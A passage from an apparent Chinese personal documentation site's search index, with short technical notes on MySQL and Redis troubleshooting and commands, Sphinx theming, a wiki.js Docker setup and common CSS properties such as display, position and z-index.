可以开启binlog日志,\n可以记录对数据库的增删改操作. 删库跑路啥的, 有binlog可以尝试恢复. 数据库CPU飙升 排查过程 使用top 命令观察，确定是 mysqld 导致还是其他原因。 如果是 mysqld 导致的，show processlist，查看 session 情况，确定是不是有消耗资源的 sql 在运行。 找出消耗高的sql，看看执行计划是否准确，索引是否缺失，数据量是否太大。 处理 kill掉这些线程（同时观察 cpu 使用率是否下降）， 进行相应的调整（比如说加索引、改sq、改内存参数） 重新跑这些 SQL。 其他情况 也有可能是每个 sq|消耗资源并不多，但是突然之间，有大量的 session 连进来导致cpu 飙升，\n这种情况就需要跟应用一起来分析为何连接数会激增，再做出相应的调整，比如说限制连接数等。 G和g作用 其实是: \\g 和 \\G \\g 表示在MySQL的sql语句后加上 \\g ，效果等同于加上定界符，一般默认的定界符是分号;\n可以兼容特意修改了定界符的情况; \\G 在MySQL的sql语句后加上 \\G ，表示将查询结果进行按列打印，可以使每个字段打印到单独的行。 因为如果不这样, 有些表列很多, 会有折行, 阅读不友好.","tags":"数据库","url":"/yq-docs-database-mysql-other-problems.html","loc":"/yq-docs-database-mysql-other-problems.html"},{"title":"遇到过的问题","text":"connection 127.0.0.0:6379 refused 连接本地redis服务端失败 查到的主要就是服务端没有启动成功 可能是bind 还需要绑定本机ip: bind    127.0.0.1,$ip 也可能是需要开始自动后台运行：daemonize（守护进程）: daemonize    yes aof文件：记录redis数据的变动情况 如果是宕机，可能是aof（append only file）文件存在错误导致redis-server没有启动成功 需要执行: # 询问是否修复（交互命令）\nredis-check-aof --fix aof文件名\n\n# 报告aof文件错误\nredis-check-aof aof文件名","tags":"数据库","url":"/yq-docs-database-redis-I-have-encountered-problems.html","loc":"/yq-docs-database-redis-I-have-encountered-problems.html"},{"title":"redis","text":"Redis 常用五大数据类型: String List (比如消息队列) Set (比如关注列表) Hash (复杂最想存储) Zset（有序集合）SortSet (比如排行榜) aof文件：记录redis数据的变动情况 注解 redis的key支持设置过期策略. 按照性能分类 单机 主从 高可用 (Redis集群) 待看: 美团万亿级 KV 存储架构与实践 阿里云Redis 好处? 距离, 电商为什么会用redis做消息系统，微服务下的高并发架构\n(作为消息中心, 生产者消费者中介) 单机就能支持10w并发(标准8核16G) docker 部署 先去 redis官网 下载一个配置文件, 因为官方docker镜像内没有 按需修改配置文件, 注意默认不设置守护线程: daemonize no 这个不要改, 改了docker启动不了... 启动: docker run --name myredis -p 6379:6379 -d \\\n-v /Users/yanque/project/code/moment-management/src/conf:/usr/local/etc/redis \\\nredis redis-server /usr/local/etc/redis/redis.conf redis-server /usr/local/etc/redis/redis.conf 表示使用此配置文件. 也可以后面进入shell手动执行","tags":"数据库","url":"/yq-docs-database-redis-redis.html","loc":"/yq-docs-database-redis-redis.html"},{"title":"使用","text":"相关命令 redis-benchmark redis性能测试 redis-check-aof 校验aof文件完整性 redis-check-rdb 检查rdb redis-cli 命令行交互式打开使用 redis-sentinel 哨兵, 与服务是一个 redis-server 服务. 启动redis可以使用: redis-server [conf-file] docker安装的redis结构 redis-cli交互指令 redis-cli -h 主机 -p 端口 -a 密码 --raw 当输出结果有中文的时候, 默认输出是16进制,\n加此选项, 解码为中文显示 也可以直接跟在redis-cli后面直接执行: redis-cli --raw get $key 关闭redis: redis shutdown 不建议直接kill, 会丢失内存数据 交互式操作 dbsize 查看当前存储的key数量 keys 查看所有key: keys * flushdb 清空当前会话的数据 auth 账户验证登陆 type 查看指定key数据类型 object encoding 查看key对应数据底层结构. 如: object encoding $key String操作 set 设置key-value 语法: set key value [EX seconds|PX milliseconds|EXAT timestamp|PXAT milliseconds-timestamp|KEEPTTL] [NX|XX] [GET] 参数选项说明 key 设置的键名 value 键对应的值 EX seconds 可选参数，过期时间, 单位秒 PX milliseconds 可选参数，过期时间, 单位毫秒, 与EX二选一即可 EXAT timestamp 可选参数，时间戳 PXAT milliseconds-timestamp 可选参数，毫秒级时间戳 KEEPTTL 可选参数，保持键的现有过期时间不变。 NX 可选参数，如果要设置的key不存在才设置, 仅使用此选项, 与 setnx 效果一致 XX 可选参数，仅在键已存在时设置键的值（即执行 \"SET IF EXISTS\" 操作）。 GET 可选参数，在设置键的值的同时，获取键的旧值 setnx 与set类似, 不过只有在键key不存在时才设置. 命令来自于 SET if Not eXists 的缩写 命令的返回值: 1：设置成功； 0：key 没有设置成功。 del 删除指定的key exists 判断指定的key是否存在 hincrby 创建指定key的hash表 hexists 判断key对应的hash表中是否存在某个值 expire 指定某个key的过期时间, 单位: 秒 incr 设置某个key自增, 就是每次设置一次后就加一 注解 对于 \"查看指定key数据类型\", 表示key对应的值的数据类型 Hash操作 HMSET hash, 批量存储 HMGET hash, 批量获取 List操作 一览 LPUSH RPUSH LPOP RPOP LRANGE BLPOP BRPOP 将一个或多个值value插入到key列表的表头（最左边）: LPUSH key value [value ...] 将一个或多个值value插入到key列表的表尾（最右边）: RPUSH key value [value ...] 移除并返回key列表的头元素: LPOP key 移除并返回key列表的尾元素: RPOP key 返回列表key中指定区间内的元素，区间以偏移量start和stop指定: LRANGE key start stop 从key列表表头弹出一个元素，若列表中没有元素，阻塞等待 timeout秒；如果timeout=0， 直阻塞等待: BLPOP key [key ...] timeout 从key列表表尾弹出一个元素，若列表中没有元素，阻塞等待 timeout秒；如果timeout=0，一直阻塞等待: BRPOP key [key ...] timeout 常用分布式数据结构 栈: Stack = LPUSH + LPOP 队列: Queue = LPUSH + RPOP 阻塞队列: Blocking MQ = LPUSH + BRPOP Set操作 一览 SADD SREM SCARD SISMEMBER SRANDMEMBER SPOP 往集合key中存入元素，元素存在则忽略， 若key不存在则新建: SADD key member [member ...] 从集合key中删除元素: SREM key member [member ...] 获取集合key中所有元素: SMEMBERS key 获取集合key的元素个数: SCARD key 判断member元素是否存在于集合key中: SISMEMBER key member 从集合key中选出count个元素(随机选取)，元素不从key中删除: SRANDMEMBER key [count] 从集合key中选出count个元素，元素从key中删除: SPOP key [count] Set运算操作 一览 SINTER SINTERSTORE SUNION SUNIONSTORE SDIFF SDIFFSTORE 交集运算: SINTER key [key ...] 将交集结果存入新集合destination中: SINTERSTORE destination key [key ..] 并集运算: SUNION key [key .] 将并集结果存入新集合destination中: SUNIONSTORE destination key [key ...] 差集运算: SDIFF key [key ...] 将差集结果存入新集合destination中: SDIFFSTORE destination key [key ...] ZSet常用操作 一览 ZADD ZREM ZSCORE ZINCRBY ZCARD ZRANGE ZREVRANGE 与Set的区别就是, 元素插入的时候要提供一个 分值 往有序集合key中加入带分值元素: ZADD key score member [[score member]...] 从有序集合key中删除元素: ZREM key member [member ...] 返回有序集合key中元素member的分值: ZSCORE key member 为有序集合key中元素member的分值加上increment: ZINCRBY key increment member 返回有序集合key中元素个数: ZCARD key 正序获取有序集合key从start下标到stop下标的元素: ZRANGE key start stop [WITHSCORES] 倒序获取有序集合key从start下标到stop下标的元素: ZREVRANGE key start stop [WITHSCORES] Zset集合操作 一览 ZUNIONSTORE ZINTERSTORE 并集计算: ZUNIONSTORE destkey numkeys key [key ...] 交集计算: ZINTERSTORE destkey numkeys key [key ...]","tags":"数据库","url":"/yq-docs-database-redis-use.html","loc":"/yq-docs-database-redis-use.html"},{"title":"rst主题","text":"参考官方文档: https://www.sphinx-doc.org/en/master/usage/theming.html","tags":"文档","url":"/yq-docs-document-RST-mark-language-About-the-topic.html","loc":"/yq-docs-document-RST-mark-language-About-the-topic.html"},{"title":"杂乱无章","text":"选项说明 -a command-line option \"a\" -1 file , --one= file , --two file Multiple options with arguments. code Here is a literal block: if literal_block:\n    text = 'is left as-is'\n    spaces_and_linebreaks = 'are preserved'\n    markup_processing = None Data Dict cat: str cat dog: str dog name: str name 类似字典说明 cat: str\ncat dog: str\ndog name: str\nname 引文 Take it away, Eric the Orchestra Leader! A one, two, a one two three four Half a bee, philosophically, must, ipso facto , half not be. But half the bee has got to be, vis a vis its entity.  D'you see? Singing...","tags":"文档","url":"/yq-docs-document-RST-mark-language-Chaotic.html","loc":"/yq-docs-document-RST-mark-language-Chaotic.html"},{"title":"doc文档转换为rst","text":"可以使用pandoc, 具有跨平台的支持, 可参考: pandoc 注意, doc不能直接转换为rst文档. 需要先转换为docx格式(直接用word/wps打开另存为docx格式即可)","tags":"文档","url":"/yq-docs-document-RST-mark-language-DOC-document-convert-to-RST.html","loc":"/yq-docs-document-RST-mark-language-DOC-document-convert-to-RST.html"},{"title":"sphinx自定义主题","text":"日期: 2023.02.24 周五 参考: 主题开发 主题目录大概结构: .\n├── __init__.py\n├── breadcrumbs.html\n├── footer.html\n├── layout.html\n├── search.html\n├── searchbox.html      以上几个html文件都是html模版\n├── static              静态资源路径\n└── theme.conf          主题配置, ini配置形式 theme.conf 配置 inherit: 继承哪个主题, 主要用于查找缺失的模版 stylesheet: main CSS name pygments_style: 待补充 sidebars: 提供了用逗号分隔的侧边栏模板列表，用于构造提要栏。可以配置 html_sidebars 覆盖此值. [options] 模块用于配置变量的值, 此处设置的值可以被 config.py 定义的 html_theme_options 覆盖. 如: [theme]\ninherit = base theme\nstylesheet = main CSS name\npygments_style = stylename\nsidebars = localtoc.html, relations.html, sourcelink.html, searchbox.html\n\n[options]\nvariable = default value 配置静态资源 默认情况下, static 目录下的文件会被复制到 _static 若需要使用其他目录下的文件, 可参考此方法: from os import path\nfrom sphinx.util.fileutil import copy_asset_file\n\ndef copy_custom_files(app, exc):\n    if app.builder.format == 'html' and not exc:\n        staticdir = path.join(app.builder.outdir, '_static')\n        copy_asset_file('path/to/myextension/_static/myjsfile.js', staticdir)\n\ndef setup(app):\n    app.connect('build-finished', copy_custom_files) 模版使用自定义函数 例, 定义函数: # 注册方法\ndef setup_my_func(app, pagename, templatename, context, doctree):\n    # 模版使用的方法\n    def my_func(mystring):\n        return \"Your string is %s\" % mystring\n    # 注册到上下文\n    context['my_func'] = my_func\n\n# 配置\ndef setup(app):\n    app.connect(\"html-page-context\", setup_my_func) 在模版中使用: <div>\n{{ my_func(\"some string\") }}\n</div> 基于配置的js脚本 方案一, 使用js_t模版 在 static 目录下配置js模版(以 js_t 为后缀的文件), 此文件最后将会转换为 _static 目录下去掉 _t 后的js文件 如: project/static/test.js_t -> project/_buid/html/_static/test.js 注解 本来就是js文件的会原样复制 方案二, 使用python函数配置 使用 Sphinx.add_js_file() , 需要先在 config.py 配置变量 如, 在 config 配置了变量 my_javascript_variable, 使用以下方式注入 # 读取变量插入到js文件\ndef add_js_variable(app):\n    # This is a configuration that you've specified for users in `conf.py`\n    js_variable = app.config['my_javascript_variable']\n    js_text = \"var my_variable = '%s';\" % js_variable\n    app.add_js_file(None, body=js_text)\n\n# builder初始化后 执行此方法\ndef setup(app):\n    # 注入配置变量\n    app.add_config_value('my_javascript_variable', 0, 'html')\n    # Run the function after the builder is initialized\n    app.connect('builder-inited', add_js_variable) Sphinx.add_js_file(js_file, text) 在文件js_file的头部插入 text, 一般为js代码 如果 js_file 为 None, 将会插入到主页面的头部 注解 如果自定义的js文件报错可能会使用基础模版的js","tags":"文档","url":"/yq-docs-document-RST-mark-language-Sphinx-custom-theme.html","loc":"/yq-docs-document-RST-mark-language-Sphinx-custom-theme.html"},{"title":"doc -> rst","text":"参考 参考[野火]sphinx文档docxtorst","tags":"文档","url":"/yq-docs-document-RST-mark-language-docx-file-conversion-RST.html","loc":"/yq-docs-document-RST-mark-language-docx-file-conversion-RST.html"},{"title":"wiki","text":"目前是直接使用的sphinx, 写rst文档, 然后通过build编译称html. 感觉差点意思, 于是找了一下有哪些开源的wiki实现. wiki.js 部署: docker run -d -p 8080:3000 --name wiki --restart unless-stopped -e \"DB_TYPE=mysql\" -e \"DB_HOST=db\" -e \"DB_PORT=3306\" -e \"DB_USER=yanque\" -e \"DB_PASS=wikijsrocks_yanque\" -e \"DB_NAME=yanque_wiki\" ghcr.io/requarks/wiki:2","tags":"文档","url":"/yq-docs-document-wiki-wiki.html","loc":"/yq-docs-document-wiki-wiki.html"},{"title":"wiki.js","text":"一个开源的 wiki 框架, 支持数据库... 官网/gitthub:: docs-wiki.js github-wiki.js 本地docker部署 部署mysql, 可参考 mysql docker run -d --name mymysql -p 3306:3306 -e MYSQL_ROOT_PASSWORD=root -e MYSQL_USER=yanque_wiki -e MYSQL_PASSWORD=yanque_wiki -e MYSQL_DATABASE=yanque_wiki mysql 部署wiki.js: docker run -d -p 8080:3000 --name wiki --restart unless-stopped -e \"DB_TYPE=mysql\" -e \"DB_HOST=172.17.0.1\" -e \"DB_PORT=3306\" -e \"DB_USER=yanque_wiki\" -e \"DB_PASS=yanque_wiki\" -e \"DB_NAME=yanque_wiki\" ghcr.io/requarks/wiki 注意: 这里的 DB_HOST , 一开始只想着数据库已经映射到本地, 脑子抽了写了个 127.0.0.1 , 一直连不上数据库. 如果要设置中文, 不要使用官网文档建议的2的tag(2只有英文), 使用最新的. 待补充...","tags":"文档","url":"/yq-docs-document-wiki-wiki.js.html","loc":"/yq-docs-document-wiki-wiki.js.html"},{"title":"navigator","text":"navigator 是一个 JavaScript 中的内置对象，提供了与浏览器相关的信息和功能。\n它是 window 对象的一个属性，可以通过 window.navigator 或者直接使用 navigator 访问。 navigator 对象包含了许多属性和方法，用于获取和操作与浏览器环境相关的信息。\n以下是一些常用的 navigator 属性和方法： navigator.userAgent 返回一个包含用户代理字符串的字符串，其中包含了浏览器的相关信息（如浏览器名称、版本号、操作系统等）。 navigator.platform 返回一个表示用户操作系统平台的字符串（如 \"Win32\"、\"Linux\" 等）。 navigator.language 返回一个表示用户首选语言的字符串，例如 \"en-US\" 表示英语（美国）。 navigator.geolocation 提供了获取用户地理位置信息的功能，包括经度、纬度等。 navigator.cookieEnabled 表示浏览器是否启用了 Cookie。 navigator.onLine 表示浏览器当前是否处于在线状态。 navigator.plugins 返回一个包含浏览器已安装插件的数组。","tags":"前端","url":"/yq-docs-front-end-Built--in-function-navigator.html","loc":"/yq-docs-front-end-Built--in-function-navigator.html"},{"title":"content","text":"注解 源于AI 在 CSS 中，content 属性用于在伪元素（:before 和 :after）中插入生成的内容。它是一个用于生成内容的内联属性。 通过使用 content 属性，您可以在伪元素中插入文本、图标、计数器或其他生成的内容，从而改变或增强文档的呈现。 下面是一个示例，演示如何使用 content 属性在伪元素中插入文本内容: .element::before {\n  content: \"前缀：\";\n}\n\n.element::after {\n  content: \"（后缀）\";\n} 在上述示例中，我们在 .element 元素的 ::before 伪元素中插入了文本 \"前缀：\"，\n在 ::after 伪元素中插入了文本 \"（后缀）\"。\n这样，每个 .element 元素都会在其内容之前和之后显示相应的文本。 content 属性可以接受不同类型的值，包括字符串、URL、计数器等。\n您可以使用引号将字符串括起来，也可以使用 CSS 函数、变量或其他 CSS 值。 此外，content 属性还可以与其他 CSS 属性一起使用，\n例如 display、position、background 等，以控制伪元素的显示和样式。 重要 content 属性仅适用于伪元素（:before 和 :after），不能直接用于真实的 HTML 元素。","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-Content.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-Content.html"},{"title":"float","text":"定义元素在哪个方向浮动 如, left（元素向左浮动）、right（元素向右浮动）","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-Float.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-Float.html"},{"title":"justify-content","text":"设置 Flexbox 布局元素在容器主轴和交叉轴上的对齐方式 justify-content 属性用于设置元素在容器的主轴（水平轴）上的对齐方式。\n它适用于使用 Flexbox 布局或 CSS Grid 布局的容器。 当你将一个元素的 display 属性设置为 flex 或 inline-flex 时，\n该元素成为一个 flex 容器，它的子元素成为 flex 项目。 常见的值包括： flex-start: 将 flex 项目靠主轴起始位置对齐（默认值，左对齐）。 flex-end: 将 flex 项目靠主轴末尾位置对齐（右对齐）。 center: 将 flex 项目在主轴上居中对齐（居中对齐）。 space-between: 将 flex 项目均匀分布在主轴上，首个项目靠起始位置，末尾项目靠末尾位置（两端对齐，项目之间平均分布）。 space-around: 将 flex 项目均匀分布在主轴上，项目之间和首末项目与容器边界之间的间距相等（项目周围平均分布）。 space-evenly: 将 flex 项目均匀分布在主轴上，包括首末项目与容器边界之间的间距都相等。 示例: .flex-container {\n  display: flex;\n  justify-content: center;\n} 将 justify-content 设置为 center , flex 容器内的项目将在主轴上居中对齐。","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-Justify-confnt.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-Justify-confnt.html"},{"title":"place-content","text":"设置 Grid 布局元素在容器中的水平和垂直对齐方式 place-content 属性是 CSS Grid 布局的一个简写属性，\n用于同时设置元素在容器中的水平和垂直方向上的对齐方式。\n它接受两个值， 第一个值表示水平对齐方式 第二个值表示垂直对齐方式。 例如： place-content: center center; 表示在容器中水平和垂直方向上居中对齐。","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-Place-Content.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-Place-Content.html"},{"title":"transition","text":"transition 是 CSS 的属性，\n用于定义元素在状态改变时的过渡效果。 通过设置 transition 属性，你可以指定在元素属性发生变化时应用的过渡效果，\n包括过渡时间、过渡类型和缓动函数等。 设置元素的过渡属性、过渡时间、过渡类型和延迟时间: transition: property duration timing-function delay;","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-Transition.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-Transition.html"},{"title":"align-items","text":"设置 Flexbox 布局元素在容器主轴和交叉轴上的对齐方式 align-items 属性用于设置元素在容器的交叉轴（垂直轴）上的对齐方式。\n它适用于使用 Flexbox 布局或 CSS Grid 布局的容器。\n常见的值包括 flex-start（默认值，顶部对齐）、flex-end（底部对齐）、\ncenter（居中对齐）、baseline（基线对齐，元素的基线对齐）等。","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-align-items.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-align-items.html"},{"title":"background","text":"background属性是一个复合属性，它用于设置元素的背景样式，\n包括背景颜色、背景图片、背景重复方式、背景位置等。 你可以通过指定多个值来设置不同的背景属性，例如: background: red url(\"image.jpg\") no-repeat center; 上述代码将把背景颜色设置为红色，背景图片设置为\"image.jpg\"，\n并设置不重复背景图片，并将背景图片居中对齐。","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-background.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-background.html"},{"title":"background-color","text":"设置背景色, 一般只要在最外层设置了背景色, 内部没特殊置顶一般都是一个色了貌似","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-background-coloror.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-background-coloror.html"},{"title":"background-image","text":"background-image属性用于单独设置元素的背景图片。\n你可以通过指定一个URL值来设置背景图片，例如: background-image: url(\"image.jpg\"); 上述代码将把元素的背景图片设置为\"image.jpg\"。","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-background-image.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-background-image.html"},{"title":"box-shadow","text":"给元素添加阴影. 阴影填充的位置为 padding 所处位置","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-box-shadow.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-box-shadow.html"},{"title":"clip","text":"clip 是一个 CSS 属性，用于指定元素的裁剪区域，即确定元素在页面上显示的部分。\n它可以用来隐藏元素的一部分内容或者创建非矩形的可视区域。 clip 属性需要配合 position: absolute; 或者 position: fixed; 使用 ，\n因为只有绝对定位或固定定位的元素才能裁剪。 clip 属性可以使用以下两种方式进行设置： rect() 使用 rect() 函数: .element {\n  position: absolute;\n  clip: rect(top, right, bottom, left);\n} 其中，top、right、bottom 和 left 是裁剪区域的边界值，可以使用像素（px）或百分比（%）来指定。 auto 使用 auto 关键字: .element {\n  position: absolute;\n  clip: auto;\n} 当使用 clip: auto; 时，元素将不会被裁剪，显示完整的内容。 当使用 clip: rect(auto, auto, auto, auto); 时，元素将根据其定位和尺寸进行自动裁剪。 注解 clip 属性在 CSS3 中已被废弃，不推荐使用。\n推荐使用更强大和灵活的 clip-path 属性来实现更复杂的裁剪效果。","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-clip.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-clip.html"},{"title":"color","text":"设置文字颜色","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-coloror.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-coloror.html"},{"title":"cursor","text":"cursor 用于指定鼠标指针在元素上的外观。\n通过设置 cursor 属性，你可以改变用户与特定元素交互时鼠标指针的样式，以提供视觉反馈或指示元素的可操作性。 cursor 属性的值可以是以下之一： 预定义光标 pointer（手型光标，表示链接或可点击元素） default（默认光标） text（文本输入光标）等。 CSS 光标值（Cursor values） 通过指定一个 URL，使用自定义图像作为光标。\n使用名为 \"cursor.png\" 的图像作为光标，\n并设置 auto 作为回退值（如果图像无法加载，则使用默认光标）: cursor: url(cursor.png), auto; 系统光标:\ncursor 属性还支持指定系统光标样式，如 crosshair（十字线）、help（帮助光标）、move（移动光标）等。\n这些样式会根据操作系统和浏览器的不同而有所变化: cursor: crosshair;","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-cursor.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-cursor.html"},{"title":"display","text":"设置元素是否被视为块或者内联元素以及用于子元素的布局，例如流式布局、网格布局或弹性布局;\n默认: inline none  此元素不会被显示 block 此元素将显示为块级元素，此元素前后会带有换行符 inline        默认。此元素会被显示为内联元素，元素前后没有换行符 inline-block  行内块元素。（CSS2.1 新增的值） list-item     此元素会作为列表显示 run-in        此元素会根据上下文作为块级元素或内联元素显示 compact       CSS 中有值 compact，不过由于缺乏广泛支持，已经从 CSS2.1 中删除 marker        CSS 中有值 marker，不过由于缺乏广泛支持，已经从 CSS2.1 中删除 table 此元素会作为块级表格来显示（类似 <table>），表格前后带有换行符 inline-table  此元素会作为内联表格来显示（类似 <table>），表格前后没有换行符 table-row-group       此元素会作为一个或多个行的分组来显示（类似 <tbody>） table-header-group    此元素会作为一个或多个行的分组来显示（类似 <thead>） table-footer-group    此元素会作为一个或多个行的分组来显示（类似 <tfoot>） flow-root     生成一个块级元素盒，其会建立一个新的块级格式化上下文，定义格式化上下文的根元素 table-row     此元素会作为一个表格行显示（类似 <tr>） table-column-group    此元素会作为一个或多个列的分组来显示（类似 <colgroup>） table-column  此元素会作为一个单元格列显示（类似 <col>） table-cell    此元素会作为一个表格单元格显示（类似 <td> 和 <th>） table-caption 此元素会作为一个表格标题显示（类似 <caption>） inherit       规定应该从父元素继承 display 属性的值 flex: Flexible Box的缩写，意为\"弹性布局\"，用来为盒状模型提供最大的灵活性。\n设为Flex布局以后，子元素的float、clear和vertical-align属性将失效 对于 flex, 还有以下拓展属性 flex-direction容器内元素的排列方向(默认横向排列) flex-wrap 容器内元素的换行(默认不换行) justify-content 元素在X轴上的排列.\n支持的值: flex-start: Flex项向行头紧挨着填充。这个是默认值。 flex-end: Flex项向行尾紧挨着填充。 center: Flex项居中紧挨着填充。 space-between: Flex项平分剩余空间。 space-around: Flex项平分剩余空间,空间在Flex项之间。 space-evenly: Flex项平分剩余空间,空间在Flex项及边缘之间。 align-items 元素在Y轴方向上的对齐方式 align-content 在弹性容器内的元素没有占用交叉轴上所有可用的空间时对齐容器内的各项（垂直） 如 parent 下的子元素上下左右都居中: .parent {\n  display: flex;\n  justify-content: center;\n  align-items: center;\n} 或者: .parent {\n  display: flex;\n  flex-direction: center;\n  place-content: center;\n  // justify-content: center;\n  align-items: center;\n\n  width: 100%;\n  height: 100%;\n}","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-disch.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-disch.html"},{"title":"font-style","text":"字体样式. 常见属性 normal 正常 italic 斜体 oblique 倾斜","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-font-style.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-font-style.html"},{"title":"font-weight","text":"字重, 可以理解为字体粗细程度, 数值越高表示字体越粗 数值范围从 100 到900，增量为 100。\n正常粗细的值是 400，而 700 的值被认为是粗体。\n一些常用的关键字值包括 bold、bolder、lighter 和 normal。","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-font-weight.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-font-weight.html"},{"title":"margin","text":"外边距 注解 元素外边距的颜色是由父代元素的颜色决定","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-margin.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-margin.html"},{"title":"padding","text":"内边距","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-padding.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-padding.html"},{"title":"position","text":"规定元素的定位类型 static: HTML 元素的默认值，即没有定位，遵循正常的文档流对象;\n静态定位的元素不会受到 top, bottom, left, right影响; relative: 相对位置, 元素的定位是相对其正常位置;\n移动相对定位元素，但它原本所占的空间不会改变; absolute: 绝对定位的元素的位置相对于最近的已定位父元素;\n如果元素没有已定位的父元素，那么它的位置相对于<html>; fixed: 元素的位置相对于浏览器窗口是固定位置;\n即使窗口是滚动的它也不会移动; sticky: 英文字面意思是粘，粘贴，所以可以把它称之为粘性定位;\n基于用户的滚动位置来定位;\n依赖于用户的滚动，在 position:relative 与 position:fixed 定位之间切换;\n行为就像 position:relative; 而当页面滚动超出目标区域时，它的表现就像 position:fixed;，它会固定在目标位置;\n元素定位表现为在跨越特定阈值前为相对定位，之后为固定定位;\n特定阈值指的是 top, right, bottom 或 left 之一，换言之，指定 top, right, bottom 或 left 四个阈值其中之一，才可使粘性定位生效。否则其行为与相对定位相同;","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-posity.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-posity.html"},{"title":"text-align","text":"设置 元素框内文本内容 的水平对齐方式 text-align 属性用于设置文本内容在元素框中的水平对齐方式。\n它适用于块级元素和一些内联元素。\n常见的值包括 left（默认值，左对齐） right（右对齐） center（居中对齐） justify（两端对齐） 等。该属性主要用于调整文本的对齐方式，而不是元素本身。","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-text-align.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-text-align.html"},{"title":"width","text":"设置元素宽度. 默认: auto. 支持实际的数值, 或者百分比, 或者一些预定义的值. 预定义的值 auto 自动 fit-content 适合内容, 比如如果内容是文本, 跟文本字符串的长度保持一致","tags":"前端","url":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-width.html","loc":"/yq-docs-front-end-CSS-CSS-commonly-used-attributes-width.html"},{"title":"元素的出场顺序(z-index)","text":"原文: https://zhuanlan.zhihu.com/p/340371083 原文是讲解 z-index 作用的. 当没有 z-index 时 没有使用 z-index 的时候，元素的层叠关系由2个因素决定 元素的 position 是否是 static : static 或 non-positioned : 没有设置 position , 这个是默认值 positioned : position 值是 relative , absolute , fixed , 或 sticky 则称 positioned positioned 元素享受特权，会覆盖 non-positioned `元素;\n而 `non-positioned 元素中，有 float 样式的元素覆盖 没有float 的 元素的\"出场\"顺序 —— 即在 html 中的顺序，同类型元素遵循 后来者居上 的原则 non-positioned / static / 无float 元素一般在最下面 当存在 z-index z-index 存在的一个背景是 Stacking Context ，\n中文常译作层叠上下文 （其实数据结构中的栈的单词也是 stack，所以层叠上下文中已经蕴含了后来者居上的意思） 构建层叠上下文仿佛 盖楼: 首先， <html> 元素是地平线或地基 —— 所有楼都是从地基开始盖的 接下来，每产生一个层叠上下文，相当于盖一座楼， z-index 的值相当于楼的高度 以下几种元素可以产生层叠上下文，且z-index的值才有效: 元素的 position 值为 absolute 或 relative， 且 z-index 值不为 auto （默认值）. 元素的 position 值为 fixed 或 sticky 元素是 flexbox 容器的子元素， 且 z-index 值不为 auto （默认值） 元素是 grid 容器的子元素, 且 z-index 值不为 auto （默认值） 元素有 opacity 值且值小于 1. 元素有以下任意一项的值，且值不为 none transform filter perspective clip-path mask / mask-image / mask-border 元素有 isolation 值且值为 isolate . 元素有 mix-blend-mode 值且值不为 normal . 元素有 -webkit-overflow-scrolling 值且值为 touch . 还有少数几种冷门的情况 层叠上下文是可以嵌套的 —— 这是最容易让人误解的一块. 嵌套，顾名思义就是在一个 层叠上下文 中能创建 另一个层叠上下文。 假如在地基上盖一座50米高的楼 (即 z-index: 50 ),\n有可能在楼里又盖一栋 100米高的楼中楼吗？当然不可能！\n但是你可以在这座楼里建一座 100 级阶梯高的大堂。 换句话说，在嵌套的层叠上下文中，\n子层叠上下文被限制在了父层叠上下文中，它们的 z-index \"单位\"已经不一样了（z-index 没有单位，这边只是用于理解）， 无论 子层叠上下文的 z-index 值有多大都无法突破父层叠上下文的高度 层叠上下文小结: <html> 元素的第一级层叠上下文 特定样式的元素可以产生新的层叠上下文，且 z-index 的值在这些元素中才有效 子层叠上下文的\"高度\"被限制在了父层叠上下文中 在同级层叠上下文中，没有（有效） z-index 的元素依然遵循上一小节的规律； z-index 值相同的元素遵循后来者居上原则 注解 层叠上下文嵌套 与 元素嵌套 不是一一对应的关系， 一个元素所处的父层叠上下文是由内向外找到的第一个能产生层叠上下文的元素所产生的层叠上下文 例: <div id=\"div1\" style=\"position: relative; z-index: 1\">\n    <div id=\"div2\" style=\"position: relative; 